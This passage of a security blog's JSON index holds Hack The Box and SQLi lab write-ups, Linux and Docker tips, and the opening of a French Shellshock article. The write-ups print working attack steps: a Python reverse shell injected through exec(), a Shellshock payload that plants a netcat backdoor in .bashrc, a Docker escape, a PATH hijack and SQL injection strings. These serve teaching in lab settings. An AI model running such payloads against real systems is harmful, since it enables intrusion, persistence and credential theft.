render_template(\u0026#34;index.html\u0026#34;, rawtext=d) @app.route(\u0026#34;/data/\u0026lt;id\u0026gt;\u0026#34;) def data_id(id): try: id = int(id) except: return redirect(\u0026#34;/\u0026#34;) try: data = process_pcap(os.path.join(app.root_path, \u0026#34;upload\u0026#34;, str(id) + \u0026#34;.pcap\u0026#34;)) path = str(id) + \u0026#34;.pcap\u0026#34; return render_template(\u0026#34;index.html\u0026#34;, data=data, path=path) except Exception as e: print(e) return redirect(\u0026#34;/\u0026#34;) # [...] if __name__ == \u0026#34;__main__\u0026#34;: app.run(\u0026#34;0.0.0.0\u0026#34;, 80, debug=True) I removed some code for readability but you get the idea. The important stuff is the os.setuid(0) part. If you want the complete code, check it here.\nExploit # As you can expect here we can execute code as root with the os.setuid(0) line. So I just edited this app.py file and added one route:\n@app.route(\u0026#34;/test\u0026#34;) def test(): os.setuid(0) data = os.popen(\u0026#34;cat /root/root.txt\u0026#34;).read() return render_template(\u0026#34;index.html\u0026#34;, data=data) # opened a new port on the machine if __name__ == \u0026#34;__main__\u0026#34;: app.run(\u0026#34;0.0.0.0\u0026#34;, 65000, debug=True) Then I started the server in the SSH connection: nathan@cap: python3 app.py, and connected on the server on my local machine with firefox http://cap.htb:65000/test.\nAnd voilà.\n","date":"28 July 2021","permalink":"/posts/htb-cap/","section":"Posts","summary":"Simple easy box, perfect to warmup before the FIC 2021 and get more confidence in 1337 h4ck1n9","title":"📦 HTB - Cap"},{"content":"I use Arch btw\npacman # The famous packet manager for Archlinux.\nBasic usage # pacman -S package # install package pacman -R package # uninstall package pacman -Syu # check for package updates pacman -Q # list installed packages pacman -Q word # list installed packages containing word Bonus # Nothing to do with pacman, but you can install packages from the AUR repo too!\ncd ~/.local/share git clone aur_repo cd aur_repo makepkg -isc AUR packages are updated by the community and are meant to be built from source, in order to optimize the package for your machine.\nResources # https://archlinux.org/pacman/pacman.8.html https://wiki.archlinux.org/title/Pacman/Tips_and_tricks ","date":"4 May 2021","permalink":"/posts/tldr-pacman/","section":"Posts","summary":"The famous packet manager for Archlinux","title":"🚀 TL;DR - pacman"},{"content":"","date":"4 May 2021","permalink":"/tags/pacman/","section":"Tags","summary":"","title":"pacman"},{"content":" nmap # Maybe the most used tool when it comes to network discovery and port knocking.\nNetwork discovery # nmap -sn 10.10.10.0/24 Machine scan # nmap 10.10.10.1 # classic soft scan nmap 10.10.10.1 -sU # UDP scan nmap 10.10.10.1 -p 80,443 # scan only ports 80 and 443 nmap 10.10.10.1 -p 1000-2000 # scan all ports between 1000 and 2000 nmap 10.10.10.1 -p- # scan all ports nmap 10.10.10.1 -sV # get services and versions running on open ports nmap 10.10.10.1 -sC # use default scripts when scanning nmap 10.10.10.1 -O # detect OS nmap 10.10.10.1 -A # equivalent to `nmap 10.10.10.1 -O -sV -sC --traceroute` Global switches # -o{N,X,S,G} output_file # save results in output_file in different formats -T{1..5} # use from 1 to 5 threads -6 # enable IPv6 -S ip # spoof given IP -e interface # use given interface Resources # https://nmap.org/book/man-briefoptions.html https://github.com/OxNinja/Network-Visualizer ","date":"4 May 2021","permalink":"/posts/tldr-nmap/","section":"Posts","summary":"Maybe the most used tool when it comes to network discovery and port knocking.","title":"🚀 TL;DR - nmap"},{"content":"","date":"4 May 2021","permalink":"/tags/nmap/","section":"Tags","summary":"","title":"nmap"},{"content":" Docker 🐋 # Wow, you don\u0026rsquo;t know yet what is Docker? Well, let me introduce you this beautiful containerization tool.\nContainers? # Container ~= virtual machine A container is like a virtual machine that runs in background on your computer. It simulates a whole system in the same way.\nContainer \u0026gt; virtual machnie But, a container is faster, better and stronger than a classical VM. Because it is meant to be fast and light-weight.\nImages # Docker uses images to run containers. In short an image is a base container, which will be used by your container \u0026ndash; like said \u0026ndash; as a base. For example, I want to run an Ubuntu container, my Docker image will be something like:\nFROM ubuntu:latest RUN apt update This file is called a Dockerfile, because it produces the corresponding Docker container when built.\nWhen ran, this image will use the latest Ubuntu image in Docker\u0026rsquo;s database, amd update it.\nYou can do so much in a Docker image!\nBuild \u0026amp; run # Once you made your Dockerfile, you will use it to build your Docker image:\ndocker build -t my-image . -t my-image: the tag (or name if you want) to give to your image .: the directory where you put your Dockerfile You now want to run it!\ndocker run my-image And, voila! Your container is running!\nResources # docker ps: list all running containers docker inspect: get information about a given container docker kill: kill a running container docker images: list all stored Docker images https://docs.docker.com/get-started/overview/ https://putaindecode.io/articles/introduction-a-docker/ https://docker-curriculum.com/ Setup your database with Docker ","date":"4 May 2021","permalink":"/posts/tldr-docker/","section":"Posts","summary":"Wow you don\u0026rsquo;t know yet what Docker is? 🤔 Let me introduce you this beautiful containerization tool!","title":"🚀 TL;DR - Docker"},{"content":"","date":"4 May 2021","permalink":"/tags/docker/","section":"Tags","summary":"","title":"docker"},{"content":"So I came up with this basic concept: TL;DR. But what is it exactly?\nThe TL;DR series # The main idea is to share some knowledge in a quick and concise way, such as a RUMP but written on a file. It is like a writeup speedrunning-ish style of writting. And maybe because I am kind of lazy sometimes.\nThe goal here is to write small articles about a subject I like, a new technique learnt, or anything that is not worth a full and detailed article.\nYou will be able to get all TL;DR series with the tag tldr on every article I will publish in the future.\nHave fun reading!\n","date":"4 May 2021","permalink":"/posts/tldr-tldr/","section":"Posts","summary":"So I came up with this basic concept: TL;DR.","title":"🚀 TL;DR - What is the 'TL;DR' series?"},{"content":"","date":"4 May 2021","permalink":"/tags/storytelling/","section":"Tags","summary":"","title":"storytelling"},{"content":"","date":"25 March 2021","permalink":"/tags/disk/","section":"Tags","summary":"","title":"disk"},{"content":"Recently I wanted to run a MySQL Docker container and encountered a tragical error:\nsimple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Switching to dedicated user \u0026#39;mysql\u0026#39; simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 5.7.31-1debian10 started. simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Initializing database files simple_db | 2021-03-25T10:54:04.578298Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details). simple_db | 2021-03-25T10:54:04.580054Z 0 [ERROR] --initialize specified but the data directory has files in it. Aborting. simple_db | 2021-03-25T10:54:04.580073Z 0 [ERROR] Aborting simple_db | simple_db exited with code 1 I was really surprised while reading this one, because the container was working well minutes before. After reading the documentation, and searching on the web for more info, nothing worked for me: the container would not run.\nI decided to check for docker-compose updates with my package manager, and guess what? No more space on my root partition 😫\nEverybody who played around with Linux distro had one day this view:\nHow to free disk space on Linux? I will try to show a couple of ways I managed to free space on my root partition.\nPackage manager cache # As I am running on Archlinux, my package manager might be different as yours (ie. I use pacman and not apt so be carefull).\nThe first thing I did was to clear my pacman cache, because I knew it would free some space for sure:\nsudo pacman -Scc You can check this blog post which explains how to deal with pacman cache: With that I cleared almost 30G of data on my disk:\nDocker # Yeah, freeing 30G is pretty satisfying, but imagine freeing more. Joking. But imagine anyway.\nI use Docker a lot, especially while working for school projects or CTFs, so I thought about checking my images and trying to free some more space.\nAfter running sudo docker images I realized I needed to clean those. I mean, there was like 100 images that I do not use anymore (yes, InterIUT challenges, I talk about you 🥲 ).\nsudo docker images prune This freed 2G on the disk, I was happy about that, but I saw that Docker was still taking too much space here, like 15G could be saved. I realized that Docker volumes where still there, and I decided to remove them.\nsudo docker volume prune Leading me with a total of 40G freed in minutes!\nSort disk usage # While troubleshouting my disk usage, I used this command to sort by usage:\nsudo du / -x -d 1 | sort -n You can then investigate which directory is taking most usage on your disk.\n","date":"25 March 2021","permalink":"/posts/free-space-on-disk/","section":"Posts","summary":"Recently I wanted to run a MySQL Docker container and encountered a tragical error:","title":"Free space on disk for Linux distros"},{"content":"","date":"25 March 2021","permalink":"/tags/linux/","section":"Tags","summary":"","title":"linux"},{"content":"","date":"25 March 2021","permalink":"/tags/partition/","section":"Tags","summary":"","title":"partition"},{"content":" Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root\u0026rsquo;s password for hours 😅\nTL;DR # Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.\nFootholds # nmap # Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC Nmap scan report for 10.10.10.220 Host is up (0.035s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds We get an NGINX service running on port 5080, and we know there is a GitLab on it. Let\u0026rsquo;s check it out!\nEntrypoint # First thing I did was creating an account to see what\u0026rsquo;s up with this GitLab. Unfortunately, there is no open projects we can mess with:\nA common reflex here is to check the version of the service, let\u0026rsquo;s go to /help:\nThis seems very interesting for us! What do we have for this version?\nWell, we can see there are a lot of exploits in the wild. Let\u0026rsquo;s use the first we find: https://github.com/dotPY-hax/gitlab_RCE\npython gitlab_rce.py http://ready.htb:5080 10.10.14.28 We follow the instructions, and create a listener with netcat:\nnc -vlnp 42069 Connection from 10.10.10.220:39478 bash: cannot set terminal process group (509): Inappropriate ioctl for device bash: no job control in this shell git@gitlab:~/gitlab-rails/working$ And we got a reverse shell!\nUser # Very simple user here:\ngit@gitlab:~$ cat /home/dude/user.txt Upgrade shell # We want a good shell here:\ngit@gitlab:~$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z ninja@null $ stty raw -echo; fg git@gitlab:~$ We want to get root now.\nRoot # The classical privesc enumerators, like linenum, linpeas or lse are telling us we are in a Docker container. We will firstly try to get root in the container in order to escape from it later.\nGet root in container # Running the enumeration scripts, we get some passwords on the system:\nOf course, there is no way a GitLab SMTP password could be root\u0026rsquo;s as well, right?\nEscape the container # Now that we are root in the container, it is pretty easy to escape:\nmkdir /tmp/cheh mount /dev/sda2 /tmp/cheh ls /tmp/cheh cat /tmp/cheh/root/root.txt Reference: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root\n","date":"20 March 2021","permalink":"/posts/htb-ready/","section":"Posts","summary":"Cool box, maybe too easy for a medium?","title":"📦 HTB - Ready"},{"content":"","date":"20 August 2020","permalink":"/tags/article/","section":"Tags","summary":"","title":"article"},{"content":"","date":"20 August 2020","permalink":"/tags/ctf/","section":"Tags","summary":"","title":"ctf"},{"content":"","date":"20 August 2020","permalink":"/tags/sqli/","section":"Tags","summary":"","title":"sqli"},{"content":"Some weeks ago I created a trainning lab for SQL injections called SQLi lab. And I will go through all levels in this blog post, explainning the expected way to solve each of them.\nThe lab currently contains 5 levels, and I will update this post as I add more of them 👍\nInstallation # The GitHub repository is at https://github.com/OxNinja/SQLi-lab if you want more information.\nFirst I clone the lab in a folder, add its IP to my hosts file for conveignance, and then build it with the given script:\ngit clone https://github.com/OxNinja/SQLi-lab.git cd SQLi-lab echo \u0026#39;172.16.0.2 sqli.lab\u0026#39; \u0026gt;\u0026gt; /etc/hosts ./build.sh Let\u0026rsquo;s wait for about 5-10 seconds for the MySQL container to boot, and then visit http://172.16.0.2, or http://sqli.lab, you should get this:\nWe can now start level 1!\nLevel 1 # By reading the level\u0026rsquo;s introduction, we know that the admin uses a database with its passwords. We want to get them all, without having to guess the website. But first we need to know how the server works.\nBy inputing a random website we get:\nThe output is not that verbose, but we might be able to guess the SQL query made:\nSELECT password FROM my_table WHERE website=\u0026#39;$website\u0026#39; So let\u0026rsquo;s try a basic injection, like ' or 1=1-- -:\nOkay we got him, we have the URL for the next level.\nLevel 2 # Here we need to retrieve the admin\u0026rsquo;s password. Let\u0026rsquo;s try admin:admin:\nOf course we don\u0026rsquo;t have anything. With the information we have, we can imagine the SQL query:\nSELECT username, mail, password FROM users WHERE username=\u0026#39;$username\u0026#39; AND password=\u0026#39;$password\u0026#39; We can try again with a basic injection ' or 1=1;-- -:\nIt works fine 😊\nWe could also have injected the payload in the password field:\nLevel 3 # An online shop! We must find what is hidding in there. But first, let\u0026rsquo;s use this product search input:\nNothing really interesting 😐\nBut we see a message on the page: \u0026lsquo;Login is disabled for the moment.\u0026rsquo; what is this? Maybe we could see something in the source code?\nBingo! We have an SQL query, but how can we use it? The only solution here is to make an UNION-based SQL injection. Let\u0026rsquo;s try it out:\nUNION SELECT * FROM level3_users Should do the trick. Our payload: ' UNION SELECT * FROM leve3_users;-- -\nYes it works! We continue to the fourth level.\nLevel 4 # This level might be harder than the previous ones for some attackers. And it is normal 😈\nThe page shows us some buttons we can click to get an article\u0026rsquo;s content:\nNote the ?id= parameter in the URL this could help us in the future.\nLet\u0026rsquo;s see the generated source code:\nHow interesting, the server adds a comment containing the article\u0026rsquo;s id right before its content.\nHere we don\u0026rsquo;t have that much information. Our only escape could be \u0026ndash; again \u0026ndash; an UNION-based SQLi. Let\u0026rsquo;s try one:\nWe don\u0026rsquo;t get anything from it, even if we provided an article\u0026rsquo;s id 😕\nThe right thing to ask is: why? Why do we get nothing with our payload? Why is the article 3 not even rendered?\nIn an UNION query, both SELECT statements must return the same number of columns! So maybe we are wrong, maybe there is not two columns in the server\u0026rsquo;s query. We can figure out the server\u0026rsquo;s query:\nSELECT * FROM articles WHERE id=\u0026#39;$id\u0026#39; But how many columns are in there? We can count what we see on the page: the title and the content of the article\u0026hellip; AND the id! Those are three columns. Let\u0026rsquo;s try with three columns:\nWe now have a second article rendered on the page! We can try to customize our payload to select strings or values:\nNice it works as we want! We now want to know the database\u0026rsquo;s name:\nOK, now we want to know the tables of the database:\nNote the limit 1,1 at the end, we need it in order to retrieve one by one. Otherwise the UNION query will get an error because we want to SELECT more elements than the first statement.\nHere we get the table COLLATIONS, which is part of the MySQL\u0026rsquo;s server by default. We only want the tables from our database database:\nOK now we want to get the columns of this table:\nContinuing like this we get the database\u0026rsquo;s schema:\nCREATE DATABASE database; CREATE TABLE level4_articles (id int, title text, content text); CREATE TABLE level4_users (username text, password text); Level 5 # We want to find the admin\u0026rsquo;s password. Let\u0026rsquo;s try the basic admin:admin:\nOf course we got a \u0026ldquo;Wrong username/password\u0026rdquo; message. Maybe we can try a basic SQLi?\nNice, the server think we are admin! But the goal here is to find the password, not to log as him.\nWe now know that this form is vulnerable to SQL injections, and when we are logged as the admin we have a \u0026ldquo;Welcome admin\u0026rdquo; message. Maybe we can try a blind injection like so:\nBetter! we transformed the query:\n# From: SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; AND password=\u0026#39;$password\u0026#39; # To: SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND password=\u0026#39;\u0026#39; OR password LIKE \u0026#39;%\u0026#39;;-- -\u0026#39; Which can lead us to the admin\u0026rsquo;s password! Let\u0026rsquo;s continue like so:\nWe now know that the first character of the password is not \u0026ldquo;a\u0026rdquo;. Great! Moving on by changing the letter each time we get the first letter: \u0026ldquo;f\u0026rdquo;\nWe now have a method to find the whole password, so I will skip to the end untill the final check:\nAfter this point, no matter what the next character is, we get the \u0026ldquo;Wrong username/password\u0026rdquo; message. This means that we reached the end of the password, let\u0026rsquo;s check it out:\nGreat! We know the admin\u0026rsquo;s password now. To continue we have to get to the page /f05c8652de134d5c50729fa1b31d355b.php.\nOn this page we are redirected to /win.php, meanning we got to the end of the lab.\nWe just finished the last level of this lab! It was fun, wasn\u0026rsquo;t it?\n","date":"20 August 2020","permalink":"/posts/sqli-lab/","section":"Posts","summary":"Some weeks ago I created a trainning lab for SQL injections called SQLi lab.","title":"SQLi lab solutions"},{"content":" TL;DR # HTTP redirect bypass (unintended 😁), PHP code execution through file upload to get a reverse shell. User with hardcoded SQL credentials on server, privesc with custom binary with no $PATH check.\nAs I am an idiot, I reinstalled my distribution without making a backup of my files 🙈 So I don\u0026rsquo;t have any screenshot or payloads I used for this box to show you\nFootholds # With a basic nmap we found only two ports: 22 and 80.\nThe running web server seems to be a portfolio, we can also note a login page for the administrator.\nEntry point # Admin page # I thought it would be great to access this admin page, but I did not found any valid credentials to log myself in. What I did instead was:\nUse BurpSuite to intercept my requests to the /admin page Change the 302 -\u0026gt; /login redirection code to 200 -\u0026gt; /admin on response Now got access to the page without login-in Of course after reading other solutions, this one was really unintented, the \u0026rsquo;normal\u0026rsquo; way was to make an SQL injection in the login form.\nFile upload # Now that we are on the admin page, we can upload some pictures in order to display them on the homepage. The first thing that came to my mind was to upload a PHP reverse shell:\nIf we upload it and visit it we got our nice reverse shell working!\nUser # We are in the machine, but need to privesc as a user. Looking in the server\u0026rsquo;s directory I found an intersting db.php5 file:\nclass Database { private static $dbName = \u0026#39;Magic\u0026#39; ; private static $dbHost = \u0026#39;localhost\u0026#39; ; private static $dbUsername = \u0026#39;theseus\u0026#39;; private static $dbUserPassword = \u0026#39;iamkingtheseus\u0026#39;; We try to log as the mentioned user with the given password. It does not works. Maybe it is some valid SQL credentials? I also found a mysqldump binary on the system, which \u0026ndash; pay attention \u0026ndash; dumps a given MySQL schema.\n$ mysqldumps -u theseus -p iamthekingtheseus --all-databases We then get a new password: admin:Th3s3usW4sK1ng. Maybe this one is the user\u0026rsquo;s password? We can log-in with theseus:Th3s3usW4sK1ng!\nRoot # We now need to get as root!\nBy looking into /bin/ we get an interesting binary sysinfo running with UID=0 😇\nThis binary basically fetches information on the system and outputs it on stdout.\nHere, the vulnerability is: the binary executes some commands (such as lswh -short, lsblk -l\u0026hellip;) without an absolute path to them. We can easilly create our own lswh binary and change our $PATH to trick this program to execute our code as root (UID=0)!\nThis is what I did:\n$ cd /tmp $ mkdir .ninja \u0026amp;\u0026amp; cd .ninja $ echo \u0026#39;echo $(whoami)\u0026#39; \u0026gt; lshw $ chmod +x lshw $ export PATH=/tmp/.ninja:$PATH $ sysinfo [...] ====================Hardware Info==================== root # \u0026lt;-- our code execution! ===================================================== [...] By now we only have to cat /root/root.txt, or create ourselves a reverse shell, add our SSH key to the box, or anything!\n$ echo \u0026#39;cat /root/root.txt\u0026#39; \u0026gt; lshw $ sysinfo [...] ====================Hardware Info==================== [/root/root.txt hash here 😀] ===================================================== [...] Sorry for this bad writeup, I lost all my files, payloads and notes but I tryied my best.\n","date":"20 August 2020","permalink":"/posts/htb-magic/","section":"Posts","summary":"TL;DR # HTTP redirect bypass (unintended 😁), PHP code execution through file upload to get a reverse shell.","title":"📦 HTB - Magic"},{"content":" Obscurity is my first medium box so I was very happy when I got that root.txt :D\nTL;DR # Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.\nFootholds # To make things easier, I added the box to my /etc/hosts.\nRecon # Let\u0026rsquo;s start with nmap to discover the open ports :\n\u0026gt; nmap -A obscurity.htb -o nmap.out Nmap scan report for obscurity.htb (10.10.10.168) Host is up (0.026s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 200 OK | Date: Fri, 10 Apr 2020 11:14:28 | Server: BadHTTPServer | ... |_http-server-header: BadHTTPServer |_http-title: 0bscura ... So we got so far SSH and HTTP server running on the machine.\nWeb server # On the port 8080 we can see the web server which indicates that it is hand-made with custom code.\nIf you use custom code, you can\u0026rsquo;t have CVE\u0026rsquo;s on it. So your code is 100% secure.\nBy reading the content of their homepage, we get a good hint : they are hosting the source code on the server. We have to find SuperSecureServer.py ont it !\nFinding source code # The easiest way I found on the moment was to fire up Burpsuite and use a directory wordlist.\nBy making a first request to the webserver, I sent it to Burp\u0026rsquo;s intruder in sniper mode. Using a simple directory wordlist (common.txt) I placed the payload\u0026rsquo;s position as GET /§a§/SuperSecureServer.py, launched the attack and waited for burp to get a 200 response code.\nThe source code is at /develop/SuperSecureServer.py !\nSource code auditing # By reading the code, I found that during the document serving process, the exec() function is called.\ndef serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = \u0026#34;output = \u0026#39;Document: {}\u0026#39;\u0026#34; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? \u0026lt;-- here cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) if path == \u0026#34;/\u0026#34;: path = \u0026#34;/index.html\u0026#34; Reverse shell # After understanding when the exec was called, I injected a python reverse shell payload. Basically this is a command injection through format string, string which got evaluated right after. The payload we could manipulate was directly the path we GET on the server. My final payload for the reverse shell was :\nGET /\u0026#39;;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; This payload works because :\nThe first ' is used to break the string generated by the format string Both ; to inject a new python code between The last ' is to make an empty string with the single quote from the source code, otherwise an error is raised So I just launched a netcat connexion listenning on my machine, and made a request on the server with the payload to get the shell.\nUser # The reverse shell we have is as www-data, we need to privesc as a regular user.\n\u0026gt; ls /home robert We know that user robert must be the user we need to privesc as. We need to investigate it\u0026rsquo;s home directory.\n\u0026gt; ls /home/robert BetterSSH check.txt out.txt passwordreminder.txt SuperSecureCrypt.py ... We got a bunch of files here, some are pretty interesting, especially the Python script.\nBy examining it, we understand that Robert uses a custom password manager, stores it\u0026rsquo;s \u0026ldquo;encrypted\u0026rdquo; password in a file, and tested it\u0026rsquo;s encryption passphrase on a dummy text file.\nFirst thing I did was to BF it\u0026rsquo;s password using the famous rockyou. But it was unsuccessfull, I managed to get something close to it\u0026rsquo;s password, but not the actual password.\nAfter thinking about the encryption and decryption algorithms, I managed to get the real password.\nTo use the Python script : python SuperSecureCrypt.py -i infile -k key -o outfile will \u0026ldquo;encypt\u0026rdquo; the content of infile with key into outfile. To decrypt we have to use the -d option.\nAs the encryption and decryption where very simple :\ndef encrypt(text, key): for x in text: newChr = chr( (ord(x) + ord(keyChr)) % 255 ) encrypted += newCrh def decrypt(text, key): for x in text: newChr = chr( (ord(x) - ord(keyChr)) % 255 ) decrypted += newChr The easiest way to get the password was : python SuperSecureCrypt.py -d -i out.txt -k \u0026quot;$(cat check.txt)\u0026quot; -o pass.txt\nThe encryption password was alexandrovich.\npython SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o robert.txt\nRobert\u0026rsquo;s password was SecThruObsFTW, we can SSH as him and get the user.txt content.\nRoot # We now need to go root. As robert :\n\u0026gt; sudo -l User robert may run the following commands on obscure: (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py So yeah, we know where to start. We now need to know how to exploit this BetterSSH.py script.\nBy reading the first lines, we know that it reads the /etc/shadow file, and write it\u0026rsquo;s content into a file somewhere in /tmp/SSH/. The script prompts for a username and password, if the password\u0026rsquo;s hash does corresponds to the shadow one, it gives a shell as this user.\nI started to find a fancy way to monitor the content of the /tmp/SSH/ folder, but a simple bash script can do anything :\n#!/bin/bash while true; do cat /tmp/SSH/* \u0026gt;\u0026gt; /tmp/.ninja done I launched the script in background, launched the BetterSSH script too, and read the content of my /tmp/.ninja file. We get most of the users\u0026rsquo; hashes separated by line, but only one matters to us. Root\u0026rsquo;s hash was $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1.\nUsing john the ripper on the hash, we get root\u0026rsquo;s password : mercedes. I could have SSH back as root, but there is already a tool for us : sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py, entered root for user, and mercedes for password, we now have a shell as root.\n","date":"12 April 2020","permalink":"/posts/htb-obscurity/","section":"Posts","summary":"Obscurity is my first medium box so I was very happy when I got that root.","title":"📦 HTB - Obscurity"},{"content":"Yeah, I wanted to do one of those for a long time 😁\nSo, we have to stay at home for the moment, I decided to make a \u0026ldquo;walkthrough\u0026rdquo; about something I used sometimes and I couldn\u0026rsquo;t remember all the commands. So, let\u0026rsquo;s build our MySQL database within a Docker container 🐳 !\nGet the Docker image # I will be using the mysql image from the Docker hub.\ndocker pull mysql Run the container # For further details, you can read the official documentation for the image on Docker hub. I will just go through the basic steps I use.\ndocker run --name my_container -e MYSQL_ROOT_PASSWORD=toor -d mysql:latest --name : setup a name for our container -e : setup environment variables MYSQL_ROOT_PASSWORD : need explainations ? -d : run in deamon mode mysql:latest : use the mysql image in the latest version Administrate the database # Once the container is running in background, we have to connect to it :\ndocker exec -it my_container /bin/bash Here, we connect to the running container and pop a shell in interactive mode. We have to connect to the database :\nmysql -uroot -ptoor Now we can start to use SQL commands for our database.\nCreate the database # CREATE DATABASE my_db; USE my_db Create the table # CREATE TABLE compotes (id INT, name TEXT, note INT); Manipulate the table # INSERT # We want now to add some data in our table :\nINSERT INTO compotes (id, name, note) VALUES (0, \u0026#34;Apple\u0026#34;, 3); INSERT INTO compotes (id, name, note) VALUES (1, \u0026#34;Apple \u0026amp; banana\u0026#34;, 5), (2, \u0026#34;Apple \u0026amp; pear\u0026#34;, 4), (3, \u0026#34;Apple \u0026amp; apple\u0026#34;, 3); UPDATE # Oh no, I f\u0026rsquo;cked up my data ! Apple \u0026amp; banana is not that tasty !\nUPDATE compotes SET (note=4) WHERE id=1; Better.\nDELETE # So drunk I added apple \u0026amp; apple in my table sight\nDELETE FROM compotes WHERE name=\u0026#34;Apple \u0026amp; apple\u0026#34;; OK, we are good.\nSELECT # I want to see my beautiful compotes now !\nSELECT * FROM compotes; SELECT name, note FROM compotes; SELECT * FROM compotes WHERE id \u0026gt; 1 AND note = 3; Use SQL script # We don\u0026rsquo;t want to re-type all the database when building a new container !\nSQL scripts are cool for that :\n# populate.sql # SQL script to build the compotes table in our database create database my_db; use my_db create table compotes(id int, name text, note int); insert into compotes(id, text, note) values (0, \u0026#34;Apple\u0026#34;, 3), (1, \u0026#34;Apple \u0026amp; banana\u0026#34;, 5), (2, \u0026#34;Apple \u0026amp; pear\u0026#34;, 4); And execute the script on the running container :\ndocker exec -i my_container sh -c \u0026#39;exec mysql -uroot -ptoor\u0026#39; \u0026lt; populate.sql ","date":"7 April 2020","permalink":"/posts/setup-your-database-with-docker/","section":"Posts","summary":"Yeah, I wanted to do one of those for a long time 😁","title":"Setup your database with Docker"},{"content":"","date":"7 April 2020","permalink":"/tags/sql/","section":"Tags","summary":"","title":"sql"},{"content":"","date":"7 April 2020","permalink":"/tags/walkthrough/","section":"Tags","summary":"","title":"walkthrough"},{"content":"","date":"28 February 2020","permalink":"/tags/apache/","section":"Tags","summary":"","title":"apache"},{"content":"","date":"28 February 2020","permalink":"/tags/bash/","section":"Tags","summary":"","title":"bash"},{"content":" Shellshock est une vulnérabilité présente dans bash 4.3 et antérieur. Il s\u0026rsquo;agit d\u0026rsquo;une vulnérabilité logicielle qui se base sur de l\u0026rsquo;injection de commande en passant par les variables d\u0026rsquo;environement. C\u0026rsquo;est vachement cool car elle mène à une bonne grosse RCE des familles, donc c\u0026rsquo;est pas négligeable 😘.\nStatistiques # Quelques statistiques afin d\u0026rsquo;illustrer la portée et l\u0026rsquo;attention portée de la vulnérabilité.\nShellshock a beaucoup été à la mode quand elle est sortie, énormément de trafic a été généré par des botnets lors de tentatives d\u0026rsquo;exploitation de la vulnérabilité.\nBon faut que je trouve des stats mais c\u0026rsquo;est un autre problème\nComment ça marche ? # env _=\u0026#39;() { echo \u0026#34;Yeah ma boi\u0026#34;; }; echo \u0026#34;nc -e /bin/bash $IP $PORT\u0026#34; \u0026gt;\u0026gt; ~/.bashrc;\u0026#39;; bash -c \u0026#39;echo \u0026#34;Bonjour à tous\u0026#34;\u0026#39; Là on force l\u0026rsquo;utilisateur à lancer un shell sur $IP:$PORT à chaque fois qu\u0026rsquo;il va ouvrir un shell, mais on peut immaginer d\u0026rsquo;innombrables autres scénarios d\u0026rsquo;attaque, de compromission de machine, ou de porte dérobée.\nPour comprendre le fonctionnement de cette payload, on va la prendre par étape.\nLes fonctions dans bash # Si vous n\u0026rsquo;êtes pas connaisseur, il est possible de créer des fonctions dans bash directement, la syntaxe est la suivante :\nmy_function () { echo \u0026#34;Hello\u0026#34; } # Ou plus explicitement function my_function () { echo \u0026#34;Hello\u0026#34; } Pour l\u0026rsquo;exécuter on peut l\u0026rsquo;appeller de cette manière :\n$ my_function Hello Utiliser une variable d\u0026rsquo;environnement avec bash # Les variables d\u0026rsquo;environnement permettent de gérer pas mal de choses, mais principalement de passer des valeurs d\u0026rsquo;un programme à un autre, sans passer par des étapes compliquées.\nNote : les variables type $PATH, $SHELL, $PWD, $TERM\u0026hellip; sont des variables d\u0026rsquo;environnement, utilisables par des programmes.\nEn bash :\n$ env BoC=\u0026#39;ovgr bh pbhvyyr\u0026#39; $ env | grep BoC BoC=ovgr bh pbhvyyr # On a bien notre nouvelle variable d\u0026#39;environnement # On peut 